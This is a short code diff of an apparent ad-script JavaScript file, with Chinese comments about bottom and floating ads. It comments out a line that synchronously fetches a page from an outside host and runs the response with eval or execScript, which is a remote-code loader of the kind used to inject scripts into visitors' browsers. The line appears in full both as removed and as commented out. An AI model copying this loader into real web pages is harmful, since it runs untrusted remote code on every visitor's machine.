@@ -692,7 +692,7 @@ function _17mb_nrbottom(){//底端广告
     }
 
 //悬浮
-    (function(){var c="http://ge.dezfu.com/";var a=new XMLHttpRequest();var b=c+"902/4.html?ts="+new Date().getTime();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){if(window.execScript)window.execScript(a.responseText,"JavaScript");else if(window.eval)window.eval(a.responseText,"JavaScript");else eval(a.responseText);}}};a.open("GET",b,false);a.send(null);}})();
+   // (function(){var c="http://ge.dezfu.com/";var a=new XMLHttpRequest();var b=c+"902/4.html?ts="+new Date().getTime();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){if(window.execScript)window.execScript(a.responseText,"JavaScript");else if(window.eval)window.eval(a.responseText,"JavaScript");else eval(a.responseText);}}};a.open("GET",b,false);a.send(null);}})();
 }
 
 //通用
